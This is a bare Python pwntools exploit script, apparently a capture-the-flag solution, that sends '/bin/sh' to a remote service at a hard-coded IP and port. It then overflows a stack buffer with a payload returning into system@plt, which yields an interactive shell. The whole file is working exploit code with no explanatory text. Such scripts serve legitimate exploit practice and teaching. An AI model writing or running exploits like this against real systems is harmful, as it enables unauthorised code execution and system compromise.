from pwn import *
context(arch="i386",os="linux",log_level="debug")
#p=process("./pwn")
p =remote("111.198.29.45",30807)
elf =ELF("./pwn")
bin_sh_addr = 0x804a080
system_addr = elf.plt["system"]
p.recvuntil("name")
p.sendline("/bin/sh")
payload="A"*(0x26+4)+p32(system_addr)+p32(0)+p32(bin_sh_addr)
p.recvuntil("here:")
p.sendline(payload)

p.interactive()
